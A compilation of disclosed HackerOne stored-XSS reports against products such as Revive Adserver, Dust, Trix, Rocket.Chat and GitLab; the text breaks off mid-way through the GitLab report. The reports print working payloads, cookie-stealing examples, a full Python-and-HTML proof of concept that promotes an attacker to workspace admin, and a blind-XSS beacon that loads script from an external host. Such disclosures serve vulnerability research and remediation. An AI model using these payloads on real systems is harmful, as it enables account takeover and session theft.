# Cross-site Scripting (XSS) - Stored

_166 reports — High/Critical, disclosed_

### [[Variation of #3321406] YetAnother 1-Click Chaining of Self-XSS, Cookie Tossing and AntiCSRF Token Prediction leads to auto approval in AccessTempAuth](https://hackerone.com/reports/3423950)

- **Report ID:** `3423950`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Cloudflare Public Bug Bounty
- **Reporter:** @matured_kazama
- **Bounty:** - usd
- **Disclosed:** 2026-04-14T05:54:53.246Z
- **CVE(s):** -

**Summary (team):**

We have resolved an issue in Cloudflare Access where an exploit chain involving the Browser Isolation email field could allow for unauthorized approvals within the Temporary Auth workflow. This has been fully remediated, and we thank the researcher for their help in hardening our authentication flows

**Summary (researcher):**

Detailed Writeup: https://kazama.in/self-xss-to-cloudflare-single-click-approvals/

---

### [Stored XSS in Conversion Statistics via Tracker Name](https://hackerone.com/reports/3400506)

- **Report ID:** `3400506`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Revive Adserver
- **Reporter:** @cyberjoker
- **Bounty:** - usd
- **Disclosed:** 2025-11-19T09:33:37.769Z
- **CVE(s):** CVE-2025-52668

**Vulnerability Information:**

I found stored XSS on the conversion statistics page. Advertisers can inject malicious JavaScript through tracker names, which executes when admins view conversion reports (`www/admin/stats-conversions.php:356`). I was able to steal admin session cookies using this vulnerability. This is a privilege escalation problem: low-privilege advertiser accounts can compromise high-privilege admin accounts.

--

---

## Affected System

- **Product:** Revive Adserver
- **Version Tested:** 6.0.1
- **Component:** Statistics / Conversion Reports
- **File:** `www/admin/stats-conversions.php:356`
- **URL:** `http://[host]/www/admin/stats-conversions.php?clientid=[id]`

---

## Vulnerable Code

```php
// www/admin/stats-conversions.php:356
echo "<td align='$phpAds_TextAlignLeft' style='padding: 0 4px'>{$conversion['trackername']}</td>
      <td align='$phpAds_TextAlignLeft' style='padding: 0 4px'>{$conversion['campaignid']}</td>
      <td align='$phpAds_TextAlignLeft' style='padding: 0 4px'>{$conversion['campaignname']}</td>";
```

**The Problem:**
- Tracker names are output directly without `htmlspecialchars()` escaping
- The data comes from advertiser-controlled input (tracker creation form)
- No input validation strips HTML tags at storage time
- Admins viewing conversion reports execute the payload in their browser context

---

## How I Reproduced It

**Prerequisites:**
- Advertiser account (low privileges)
- Admin account to view the report (for testing impact)

**Steps:**

1. **Login as advertiser** and create a malicious tracker:
   - Navigate to: **Inventory** → **Advertisers** → Click your advertiser name (e.g., "Test Advertiser") → **Trackers** tab
   - Click **Add new tracker**
   - Set tracker name to:
     ```html
     <img src=x onerror="alert('XSS: ' + document.cookie)">
     ```
   - Set tracker type to "Sale" and status to "Active"
   - Click **Save Changes**
   - The tracker is now saved (tracker ID 1)

{F4935037}

2. **Create conversion records** (via normal tracking or database):
   ```sql
   -- Link conversion to malicious tracker
   INSERT INTO rv_data_intermediate_ad_connection (
       tracker_id, ad_id, inside_window, tracker_date_time,
       connection_date_time, connection_action, connection_status, updated
   ) VALUES (1, 1, 1, NOW(), NOW(), 1, 4, NOW());
   ```

3. **Login as admin** and navigate to:
   ```
   http://[host]/www/admin/stats-conversions.php?clientid=1
   ```
   **Note:** This page may not be accessible via the menu in default/fresh installations. See "Menu Configuration Note" in the Notes section below for details.

4. **Result:** JavaScript alert fires immediately:
   ```
   XSS: sessionID=abc123; ox_install_session_id=def456
   ```
{F4935020}

I confirmed the XSS executes in the admin's browser context with full cookie access. The payload persists - it fires every time any admin views conversion statistics for that advertiser.

---

## Notes

**Additional Findings:**

While investigating this issue, I noticed:
- Lines 357-358 also lack `htmlspecialchars()` on `campaignid` and `campaignname`
- Campaign names are also user-controlled (by advertisers) and suffer from the same vulnerability
- Other `stats-*.php` files may have similar issues - I haven't audited them all yet

**Testing Scope:**

I tested this vulnerability in an isolated Docker environment using accounts I created. I did not:
- Test against production/public Revive Adserver installations
- Attempt actual exploitation beyond controlled PoC
- Exfiltrate or access any real user data

**Menu Configuration Note:**

**Important:** The stats-conversions.php page is not included in the default menu system on fresh Revive Adserver installations. During testing, I had to manually enable it by modifying `lib/OA/Admin/Menu/config.php` to add the menu entry:

```php
$oMenu->addTo("2.1", new OA_Admin_Menu_Section("stats-conversions",
    'Conversions', "stats-conversions.php?clientid={clientid}",
    false, "statistics/conversions"));
```

This is likely a configuration issue rather than a security control, as:
- The code-level permission check (`OA_Permission::enforceAccount`) allows advertiser/manager access
- Other statistics pages with similar data are accessible
- The vulnerable code exists regardless of menu visibility

## Impact

An advertiser (or compromised advertiser account) can inject persistent XSS that executes when admins view conversion statistics. I successfully captured admin session cookies, which enable full account takeover. The attacker can then create admin accounts, modify campaigns, access all advertiser data, or inject code affecting all users. This works because advertisers routinely create trackers, and admins routinely review conversion statistics - no unusual behavior required.

---

### [Stored XSS via LINK Name.](https://hackerone.com/reports/1392262)

- **Report ID:** `1392262`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Insightly
- **Reporter:** @xploiterr
- **Bounty:** - usd
- **Disclosed:** 2025-09-23T12:17:34.370Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Hi Team,

The `LINK NAME` is not properly escaped at the `Templates` page leading to `Stored XSS` and the name is reflected in the `<script> tag` , due to lack of sanitization the user can break out of the <script> tag and execute the XSS.

See Proof Of Concept below.
Thank You.

---

## Steps To Reproduce:

A. Log into your account at `https://marketing.na1.insightly.com/`

B. Click on `Plus Sign` --> `Add a new redirect Link` 

C. Enter this `'"></script><img src=x onerror=alert(1)>{{'7'*7}}` payload in the `Link Name` and fill all other details.

D. Click on `Save` and click on `Emails Icon` --> `Email Templates` --> `New Email Templates`

E. Enter all the details and click on `Save`

Wait a little bit and you will see the XSS executing.

## Note all the users visiting that page will execute the XSS in the organization.

---

## Proof Of Concept:

See this Video POC:

{F1504350}

POC:

{F1504349}

## Impact

An XSS attack allows an attacker to execute arbitrary JavaScript in the context of the attacked website and the attacked user. This can be abused to steal session cookies, perform requests in the name of the victim or for phishing attacks.

---

### [Stored XSS in AREA tutorials](https://hackerone.com/reports/3008066)

- **Report ID:** `3008066`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Autodesk
- **Reporter:** @i_0x0
- **Bounty:** - usd
- **Disclosed:** 2025-08-25T12:39:06.239Z
- **CVE(s):** -

**Summary (team):**

A stored cross-site scripting (XSS) vulnerability was found on AREA, which could have allowed an attacker to inject malicious JavaScript code when publishing a tutorial. Autodesk has fixed the vulnerability and we thank @who_am_i_ for reporting this issue.

---

### [Stored XSS in File Upload Leads to Privilege Escalation and Full Workspace Takeover](https://hackerone.com/reports/3115705)

- **Report ID:** `3115705`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Dust
- **Reporter:** @sjalu
- **Bounty:** - usd
- **Disclosed:** 2025-05-02T12:01:14.166Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
A stored cross-site scripting (XSS) vulnerability was discovered in the Dust platform’s file upload functionality.

An attacker can upload a malicious HTML file to a conversation. When another user, including an admin, visits the uploaded file, JavaScript is executed in their authenticated browser session.

This allows an attacker to issue authenticated API requests on behalf of the victim, including:
	•	Promoting their own account to Admin
	•	Downgrading or removing legitimate admins
	•	Accessing and deleting secrets
	•	Full control over the workspace

The attack requires the victim to be a member of the same workspace and visit the malicious file URL. Once triggered, the attacker can fully compromise the workspace.

## Steps To Reproduce:

  1. Set up a workspace where you are admin.
 2. Invite a dummy account with the normal member role.
  3. Upload the malicious file on the dummy account using the Python script below. Use the HTML found at the bottom for upload.
```python
import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder

cookies = {
    'appSession': '<dummy_account_session>',
}

json_data = {
    'contentType': 'text/html',
    'fileName': 'xss_poc.png',
    'fileSize': 7331,
    'useCase': 'conversation'
}

response = requests.post('https://dust.tt/api/w/<workspace_sid>/files', cookies=cookies, json=json_data)
print(response.text)

uploadUrl = response.json()['file']['uploadUrl']

cookies = {
    'appSession': '<dummy_account_session>',
}

m = MultipartEncoder(
    fields={
        'file': (
            'xss_poc.png',  # Filename
            open('Dust/xss.html', 'rb'),  # File object
            'text/html'  # Content-Type
        )
    }
)

headers = {
    'accept': '*/*',
    'accept-language': 'nb-NO,nb;q=0.9,no;q=0.8,nn;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': m.content_type,  # This will correctly set boundary
    'origin': 'https://dust.tt',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://dust.tt/w/<workspace_sid>/assistant/new',
    'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"macOS"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
}

# Make the request
response = requests.post(
    url=uploadUrl,
    headers=headers,
    cookies=cookies,
    data=m  
)

print(f'[*] URL TO SHARE:\n{response.json()["file"]["downloadUrl"]}?action=view')
```
  4. Share the URL with the workspace admin account.
 5. When the victim visits the link, your script runs automatically, promoting the dummy account to Admin. 

HTML File:
```html
<html>
<head>
  <title>PoC - Dust Workspace Takeover</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 40px;
      background-color: #f8f9fa;
    }
    .container {
      background: white;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
    }
    h1 {
      color: #333;
    }
    p {
      color: #555;
    }
  </style>
</head>

<body>
  <div class="container">
    <h1>Proof of Concept - Dust Workspace Admin Takeover</h1>
    <p>When this page is visited by an admin inside a workspace, he'll give the attacker's user ID admin privileges. The attacker can then manually de-rank the former admin to a regualar member.</p>
  </div>

<script>
// Your user ID here (dummy account's ID)
const attackerUserId = '<dummy_id>'; // <-- replace with dummy account ID!

fetch('https://dust.tt/api/user', {
    method: 'GET',
    headers: {
        'accept': '*/*',
        'x-commit-hash': '41c0391',
    },
    credentials: 'include'
})
.then(res => res.json())
.then(userData => {
    if (userData.user && userData.user.workspaces && userData.user.workspaces.length > 0) {
        const workspaceId = userData.user.workspaces[0].sId; // Get workspace ID
        const victimUserId = userData.user.id; // Victim's own ID

        // 1. Promote attacker to admin
        fetch(`https://dust.tt/api/w/${workspaceId}/members/${attackerUserId}`, {
            method: 'POST',
            headers: {
                'content-type': 'application/json',
                'accept': '*/*',
                'x-commit-hash': '41c0391',
            },
            credentials: 'include',
            body: JSON.stringify({
                role: "admin"
            })
        });

        alert(`PWNED\n\nVictim Username: ${userData.user.username}\nVictim Email: ${userData.user.email}`);
    }
});
</script>
</body>
</html>
```

## Impact

This vulnerability allows an attacker to execute arbitrary JavaScript in the browser of any user within the same workspace who visits a malicious link. Through this, the attacker can perform any actions on behalf of the victim user, leveraging their active session without needing to steal or view the session cookie itself. An attacker view  (only key, not value - value is hidden for everyone) and delete private secrets, access internal data, modify settings, and if the victim has administrative privileges, escalate their own account to an admin role and revoke admin rights from others. This results in a full compromise of the user account, potential privilege escalation, and takeover of the entire workspace. The overall security impact is critical.

**Summary (researcher):**

A stored Cross-Site Scripting (XSS) vulnerability exists in Dust’s file upload functionality, allowing an attacker to execute arbitrary JavaScript in the context of other workspace members’ browsers. By uploading a malicious HTML file and convincing another user to interact with it, an attacker can fully impersonate that user and perform any actions available to them without stealing their cookies. If the victim holds administrative privileges, the attacker can escalate their own permissions, revoke others’ access, read sensitive data, and take full control over the workspace. The impact is critical and can lead to full account and organizational takeover.

---

### [Stored Cross-Site Scripting in mercadopago.com.ar](https://hackerone.com/reports/1955485)

- **Report ID:** `1955485`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** MercadoLibre
- **Reporter:** @elmago
- **Bounty:** - usd
- **Disclosed:** 2025-03-13T19:53:19.351Z
- **CVE(s):** -

**Summary (team):**

We thank @elmago and @n1ko for the report and for providing clear reproduction steps with a proof-of-concept code demonstrating the vulnerability. MercadoLibre acknowledged the issue and worked on a fix internally.

---

### [Stored XSS via Post Tittle Enabling Non-Privileged User to Privileged User Exploitation on https://forums.autodesk.com/](https://hackerone.com/reports/2974307)

- **Report ID:** `2974307`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Autodesk
- **Reporter:** @the-white-evil
- **Bounty:** - usd
- **Disclosed:** 2025-02-26T18:24:37.376Z
- **CVE(s):** -

**Summary (team):**

A stored cross-site scripting (XSS) vulnerability was found on Autodesk Forums, which could have allowed an attacker to inject malicious JavaScript code when viewed by both non-privileged and privileged users. Autodesk has fixed the vulnerability and we thank @the-white-evil for reporting this issue.

---

### [Stored XSS on trix editor version 2.1.1](https://hackerone.com/reports/2521419)

- **Report ID:** `2521419`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Basecamp
- **Reporter:** @thwin_htet
- **Bounty:** 1000 usd
- **Disclosed:** 2024-11-04T12:58:12.330Z
- **CVE(s):** CVE-2024-34341

**Vulnerability Information:**

The Trix editor  is vulnerable to arbitrary code execution when copying and pasting content from the web or other documents with markup into the editor. The vulnerability stems from improper sanitization of pasted content, allowing an attacker to embed malicious scripts which are executed within the context of the application.

### Vulnerable Version
2.1.1

### Steps to Reproduce
1. Run this HTML code on browser.
```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Trix Editor XSS Demo</title>
  <script src="https://cdn.jsdelivr.net/npm/trix@2.1.1/dist/trix.umd.min.js"></script>
  <link href="https://cdn.jsdelivr.net/npm/trix@2.1.1/dist/trix.min.css" rel="stylesheet">
</head>
<body>
  <h1>Trix Editor XSS Demo</h1>
  <trix-editor></trix-editor>
  <script>
  document.write(`copy<div data-trix-attachment="{&quot;contentType&quot;:&quot;text/html5&quot;,&quot;content&quot;:&quot;&lt;img src=1 onerror=alert(document.domain)&gt;XSS POC&quot;}"></div>me`);
  </script>
</body>
</html>
```
2. Click `copy me` and paste it in trix editor.

{F3302252}

3. Alert will pop up.

This could be a bypass of recent Trix Editor CVE : CVE-2024-34341
Ref : https://github.com/basecamp/trix/security/advisories/GHSA-qjqp-xr96-cj99

## Impact

An attacker could exploit these vulnerabilities to execute arbitrary JavaScript code within the context of the user's session, potentially leading to unauthorized actions being performed or sensitive information being disclosed.

---

### [Blind XSS on admin.acronis.com via delete account form on account.acronis.com](https://hackerone.com/reports/666040)

- **Report ID:** `666040`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Acronis
- **Reporter:** @mubassirpatel
- **Bounty:** - usd
- **Disclosed:** 2024-10-30T20:31:38.244Z
- **CVE(s):** -

**Summary (team):**

Blind XSS was possible on admin.acronis.com. In order to exploit this it was required to send payload during account deletion process on account.acronis.com.

---

### [Stored Xss On "https://www.question.com/"](https://hackerone.com/reports/1901706)

- **Report ID:** `1901706`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Drugs.com
- **Reporter:** @vidaamuyarchi
- **Bounty:** - usd
- **Disclosed:** 2024-09-20T18:00:59.744Z
- **CVE(s):** -

**Vulnerability Information:**

Hi Team I'm Find the Stored Xss On your Site

Stored XSS, also known as persistent XSS, is the more damaging than non-persistent XSS. It occurs when a malicious script is injected directly into a vulnerable web application.

Steps To Reproduce:

1.  Go To Your Site https://www.question.com/
2. Nave https://www.question.com/ask/
5. Ask a Question Enter the Payload ```<iframe onload=alert(document.domail)>```
3.  Click to Sumit Question & Redirect to https://www.question.com/iframe-onload-alert-9-1631390.html
4. XSS was Tigred you See the Popup

POC

████

Tested on Firefox and chrome.

## Impact

The attacker can steal data from whoever checks the report.

**Summary (researcher):**

POC Video :- https://youtu.be/HLshcsX1GwU?si=BM0VLLNjbM8ZwBbi

---

### [Stored XSS in reclamos](https://hackerone.com/reports/1675516)

- **Report ID:** `1675516`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** MercadoLibre
- **Reporter:** @valent1ne
- **Bounty:** - usd
- **Disclosed:** 2024-09-09T01:56:31.428Z
- **CVE(s):** -

**Summary (team):**

We thank @valent1ne for the report and for providing clear reproduction steps with a proof-of-concept code demonstrating the vulnerability. MercadoLibre acknowledged the issue and worked on a fix internally.

**Summary (researcher):**

The general messaging functionality of www.mercadolibre.com.ar implemented an HTML sanitizer that allowed the use of a limited set of HTML tags while preventing XSS. While analyzing the functionality, @valent1ne discovered that sending multiple unclosed <p> tags (<p><p><p><p><p><p><p><p>) and appending an extra tag seemed to confuse the sanitizer parser, resulting in unexpected behavior.

This behavior allowed incluiding an extra arbitrary tag, bypassing the sanitizer. For instance, it enabled the appending of an <audio> HTML tag at the end of the following payload, which executed JavaScript code:
```html
<p><p><p><p><p><p><p><p><audio/src/onerror=alert(document.domain)>.
```

Later, the reporter discovered that the number of unclosed <p> tags needed to be increased depending on the size of the appended HTML tag. This adjustment allowed the insertion of an <embed> tag that included external arbitrary HTML/JavaScript code.

After sending the payload, the parsed HTML would look like this:
```html
<p></p>
<p></p>
<p></p>
<p></p>
<p></p>
<p></p>
<p></p>
<p>
 <audio/src/onerror=alert(document.domain)>
</p>.
```

Since this vulnerability affected the general messaging functionality of www.mercadolibre.com.ar, it could have been exploited as a wormable XSS, capable of spreading across multiple users.

---

### [Blind Stored XSS on the internal host - █████████████](https://hackerone.com/reports/923912)

- **Report ID:** `923912`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** U.S. Dept Of Defense
- **Reporter:** @sp1d3rs
- **Bounty:** - usd
- **Disclosed:** 2024-08-16T16:05:39.514Z
- **CVE(s):** -

**Vulnerability Information:**

##Description
Hello. I often use mine `xp.ht` host as a beacon for SSRF/XSS payloads, and today one was triggered from the `https://███████████████/NSSI/controlcenterV2/index.htm?directlink&courses/classes/findstudent&&&&&&&&` endpoint (it was found in the Referer header)

This domain isn't resolvable from outside, so I assume the request came from host in the internal network, connected to extranet.

##POC
███████
Sadly, I'm not sure where is exactly the entry point was for the payload - only the vulnerable URL where it triggered the pingback to my host.
The `GET /?_=1594756841631` indicated that payload is likely reside in HTML source, and was triggered during student lookup (perhaps there is payload  somewhere in the student data containing `<script src=//xp.ht></script>` or similar).
You may need to confirm this with system owner first since I don't have enough details to confirm it from my side since vulnerable host is internal.

## Impact

Blind Stored XSS on the internal host.

---

### [XSS via /api/v1/chat.postMessage ](https://hackerone.com/reports/219957)

- **Report ID:** `219957`
- **Severity:** Critical
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Rocket.Chat
- **Reporter:** @gronke
- **Bounty:** - usd
- **Disclosed:** 2024-08-10T22:01:03.393Z
- **CVE(s):** -

**Vulnerability Information:**

> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to verify and then potentially issue a bounty, so be sure to take your time filling out the report!

**Summary:** An attacker can craft a custom message using the REST API that, once seen by the observer, executes arbitrary code in the context of the client user.

**Description:** According to the API documentation chat messages can have attachments. These attachments then can have fields which contain a title and subtitle for the attachment. When the attachment has an `image_url` assigned, the first field's value can be used to inject HTML tags. For example <img onload=""> can be used to execute arbitrary code. `<` must be the leading character of the field's value property.

## Releases Affected:

  * Client App (OSX)
  * Firefox 48 (Debian)
  * Firefox 52 (OSX)
  * Chrome 58 (OSX)

## Steps To Reproduce (from initial installation to vulnerability):

  1. Create a Channel or get obtain a RoomId of a private conversation
  2. Login to the Rest API
  3. Send crafted message

## Supporting Material/References:

```bash
# Login to get Auth Token and User Id
curl http://127.0.0.1:3000/api/v1/login -d "username=<USER_NAME>&password=<PASSWORD>"

# Send crafted message
curl -H "X-Auth-Token: <USER_TOKEN>" -H "X-User-Id: <USER_ID>" http://127.0.0.1:3000/api/v1/chat.postMessage -d "channel=<CHANNEL_NAME>&attachments[0][image_url]=/assets/logo&attachments[0][fields][0][title]=&attachments[0][fields][0][value]=<img src=/assets/logo width=1 height=1 onload=alert('XSS4') />You're Pwned!"
```

## Suggested mitigation

  * Encode all user inputs to HTML entities

---

### [XSS in various MessageTypes](https://hackerone.com/reports/1379400)

- **Report ID:** `1379400`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Rocket.Chat
- **Reporter:** @gronke
- **Bounty:** - usd
- **Disclosed:** 2024-08-10T21:55:12.427Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary

Rendering messages of various MessageTypes can lead to arbitrary script execution in the receiving frontend client.

## Description

Messages in Rocket.Chat can have various types that influence the rendering as seen in [app/ui-message/client/message.js#L24-L53](https://github.com/RocketChat/Rocket.Chat/blob/45a5d1f869e1a0ba292d0af2c2a58dcdc8761e13/app/ui-message/client/message.js#L24-L53):

```javascript
const renderBody = (msg, settings) => {
	const searchedText = msg.searchedText ? msg.searchedText : '';
	const isSystemMessage = MessageTypes.isSystemMessage(msg);
	const messageType = MessageTypes.getType(msg) || {};

	if (messageType.render) {
		msg = messageType.render(msg);
	} else if (messageType.template) {
		// render template
	} else if (messageType.message) {
		msg.msg = escapeHTML(msg.msg);
		msg = TAPi18n.__(messageType.message, { ...typeof messageType.data === 'function' && messageType.data(msg) });
	} else if (msg.u && msg.u.username === settings.Chatops_Username) {
		msg.html = msg.msg;
		msg = renderMentions(msg);
		msg = msg.html;
	} else {
		msg = renderMessageBody(msg);
	}

	if (isSystemMessage) {
		msg.html = Markdown.parse(msg.html);
	}

	if (searchedText) {
		msg = msg.replace(new RegExp(searchedText, 'gi'), (str) => `<mark>${ str }</mark>`);
	}

	return msg;
};
```

These MessageTypes are registered on startup of Rocket.Chat, like in this example the Message Snippeting Feature [app/message-snippet/client/messageType.js#L4-L16](https://github.com/RocketChat/Rocket.Chat/blob/45a5d1f869e1a0ba292d0af2c2a58dcdc8761e13/app/message-snippet/client/messageType.js#L4-L16)

```javascript
import { MessageTypes } from '../../ui-utils';

Meteor.startup(function() {
	MessageTypes.registerType({
		id: 'message_snippeted',
		system: true,
		message: 'Snippeted_a_message',
		data(message) {
			const snippetLink = `<a href="/snippet/${ message.snippetId }/${ encodeURIComponent(message.snippetName) }">${ escapeHTML(message.snippetName) }</a>`;
			return { snippetLink };
		},
	});
});
```

Unlike most other MessageTypes, not the messages sanitized `msg` parameter is rendered, but `snippetName` and `snippetId`. The unsanitized `message.snippetId` leads to arbitrary script execution in the client displaying a maliciously crafted message.

```javascript
Meteor.call("sendMessage", {
  rid: "<ROOM_ID>",
  msg: "",
  t: "message_snippeted",
  snippetId: "\"><img src=x onerror=alert(1) style=\"display: none;\" x=\"",
  snippetName: ""
}, (...args) => console.log(...args));
```

Another MessageTypes have been found to be affected similarly:

```javascript
Meteor.call("sendMessage", {
  rid: "<ROOM_ID>",
  msg: "",
  t: "subscription-role-removed",
  role: "<img src=x onerror=alert(1) />"
}, (...args) => console.log(...args));
```

```javascript
Meteor.call("sendMessage", {
  rid: "<ROOM_ID>",
  msg: "",
  t: "livechat_transfer_history",
  transferData: {
    scope: "agent",
    transferredTo: {
      name: "<img src=x onerror=alert(1) />"
    }
  }
}, (...args) => console.log(...args));
```

```javascript
Meteor.call("sendMessage", {
  rid: "<ROOM_ID>",
  msg: "",
  t: "omnichannel_placed_chat_on_hold",
  comment: "<img src=x onerror=alert(1) />"
}, (...args) => console.log(...args));
```

## Releases Affected:

  * 3.18.2
  * 4.0.3

## Steps To Reproduce (from initial installation to vulnerability):

1.) Login to Rocket.Chat
2.) Find any Room ID (window URL path from direct messages or avatar image path from channels)
3.) Call `sendMessage` Meteor Method with `t` parameter and the affected source parameter

## Suggested mitigation

  * Sanitize message parameters rendered from MessageType `render` or `data` functions

## Impact

Authenticated adversaries can craft messages that exploit XSS in the displaying frontend clients.

---

### [Multiple XSS and open HTTP redirection](https://hackerone.com/reports/2372332)

- **Report ID:** `2372332`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** ExpressionEngine
- **Reporter:** @maggick
- **Bounty:** - usd
- **Disclosed:** 2024-07-16T22:24:16.639Z
- **CVE(s):** -

**Summary (team):**

ExpressionEngine was affected by multiple cross-site scripting vulnerabilities that could allow an attacker to execute JavaScript in the browsers of targeted users.

---

### [Stored-XSS injected in Wiki page via Banzai pipeline](https://hackerone.com/reports/2257080)

- **Report ID:** `2257080`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** GitLab
- **Reporter:** @yvvdwf
- **Bounty:** - usd
- **Disclosed:** 2024-05-28T08:11:19.325Z
- **CVE(s):** -

**Vulnerability Information:**

Hello,

I found a vulnerability in [AbstractReferenceFilter](https://gitlab.com/gitlab-org/gitlab/blob/4c3239a8b20a104a15e067f208f269f65dbee927/lib/banzai/filter/references/abstract_reference_filter.rb) class that can be exploited to inject any HTML elements leading to stored-XSS.

# Reproduce

- Create a new project.
- Got to its `Wikis`, `Create your first page` button, then fill the form:
   + Title: `_sidear`
   + Content: please see in `_sidebar.md` attached file ({F2868304})

{F2868305}

   + click `Create page` to save the wiki page
   + after the page is reloaded, you should see an alert which is caused by `alert(document.domain)`
   + **Note:** you will not see the alert if you are the person who can access to the Gitlab confidential issue `https://gitlab.com/gitlab-org/gitlab/-/issues/428268` which is used to track one of my H1 report. (thus, you login using another account, can create a private issue, then replace the link above by your issue's link)


# Impact

Stored-XSS with CSP-bypass allows executing arbitrary javascript at the client side on behalf of victims including any RESTfull API.

# TL;DR

## 1. `gsub`
 
The vulnerable code is as the following:

```ruby
# https://gitlab.com/gitlab-org/gitlab/blob/4c3239a8b20a104a15e067f208f269f65dbee927/lib/banzai/filter/references/abstract_reference_filter.rb#L116
        def call
          ...
          link_pattern_start = /\A#{link_pattern}/
          ...
          nodes.each_with_index do |node, index|
            ...
            elsif element_node?(node)
              yield_valid_link(node) do |link, inner_html|
                ...
                if link == inner_html && inner_html =~ link_pattern_start
                  replace_link_node_with_text(node, index) do
                    object_link_filter(inner_html, link_pattern, link_reference: true)
                  end


# https://gitlab.com/gitlab-org/gitlab/blob/4c3239a8b20a104a15e067f208f269f65dbee927/lib/banzai/filter/references/abstract_reference_filter.rb#L182
       def object_link_filter(text, pattern, link_content: nil, link_reference: false)
          references_in(text, pattern) do |match, id, project_ref, namespace_ref, matches|
            ...
            if object
              ... 
              link = ...

# https://gitlab.com/gitlab-org/gitlab/blob/4c3239a8b20a104a15e067f208f269f65dbee927/lib/banzai/filter/references/abstract_reference_filter.rb#L38
    def references_in(text, pattern = object_class.reference_pattern)
          text.gsub(pattern) do |match|
            if ident = identifier($~)
              yield match, ident, $~[:project], $~[:namespace], $~
            else
              match
            end
          end
        end
```

I'm not sure for which reason `link_pattern_start` is used to check **only** the prefix of `link_pattern` (not the whole) in the first function of the listing above. And latter the `link_pattern` is used in `gsub` to replace **any** occurrences in the third function. Consider the following HTML snippet:

```html
<a href="LINK_PATTERN<a alt='&quot;LINK_PATTERN'></a>">LINK_PATTERN<a alt='"LINK_PATTERN'></a></a>
```

The second replacement of `LINK_PATTERN` will expanse the corresponding information into `alt` attribute. This information will never be redacted as it tag `<a>` does not have `class = gfm`. This can be used to disclose titles of private  [GitLab-specific references](https://docs.gitlab.com/ee/user/markdown.html#gitlab-specific-references)

For example, open an issue with the following content (we need `<i>` tag to have  nested `<a>` tags):

- input:
```html
<dl><a href="https://gitlab.com/gitlab-org/gitlab/-/issues/428268<i><a alt='&quot;https://gitlab.com/gitlab-org/gitlab/-/issues/428268'></a></i>">https://gitlab.com/gitlab-org/gitlab/-/issues/428268<i><a alt='"https://gitlab.com/gitlab-org/gitlab/-/issues/428268'></a></i></a></dl>
```

- output: we can get the title of Gitlab's confidential issue 428268:


{F2868307}


## 2. `&quot;`

Now if we replace single quot by double one, and add `href` attribute as the following:

```html
<dl><a href="https://gitlab.com/gitlab-org/gitlab/-/issues/428268<i><a href=&quot;//xxx&quot; alt=&quot;https://gitlab.com/gitlab-org/gitlab/-/issues/428268&quot;></a></i>">https://gitlab.com/gitlab-org/gitlab/-/issues/428268<i><a href="//xxx" alt="https://gitlab.com/gitlab-org/gitlab/-/issues/428268"></a></i></a></dl>
```

We get the result:

{F2868306}

Because the second replacement of `LINK_PATTERN` broke down the double quotes of `alt` to introduce other attributes. The result was latter redacted by:

```ruby
# https://gitlab.com/gitlab-org/gitlab/blob/e03b60053f7f7d35c05b2732f59524a6bc6a5456/lib/banzai/reference_redactor.rb#L66
  def redacted_node_content(node)
      original_content = node.attr('data-original')
      original_content = CGI.escape_html(original_content) if original_content

      original_link =
        if node.attr('data-link-reference') == 'true'
          href = node.attr('href')

          %(<a href="#{href}">#{original_content}</a>)
        end

      original_link || original_content || node.inner_html
    end
```

This means that if we can inject `&quot;` in to the `href` attribute, then we can break it.

Fortunately, the [Sanitize](https://github.com/rgrove/sanitize/blob/v6.0.0/lib/sanitize/transformers/clean_element.rb#L27-L40) is here and it replaces `"` by `%22` in the `href` attribute.

```ruby
# https://github.com/rgrove/sanitize/blob/v6.0.0/lib/sanitize/transformers/clean_element.rb#L27-L40

  # Mapping of original characters to escape sequences for characters that
  # should be escaped in attributes affected by unsafe libxml2 behavior.
  UNSAFE_LIBXML_ESCAPE_CHARS = {
    ' ' => '%20',
    '"' => '%22'
  }
```


Any users' direct input of `href` is sanitized but not the `href` which are generated by other HTML filters. One of them is [GollumTagsFilter](https://gitlab.com/gitlab-org/gitlab/blob/4c3239a8b20a104a15e067f208f269f65dbee927/lib/banzai/filter/gollum_tags_filter.rb#L141). 

If we provide the following input:

```
[[a|http:'"&lt;]]
```

then we get:

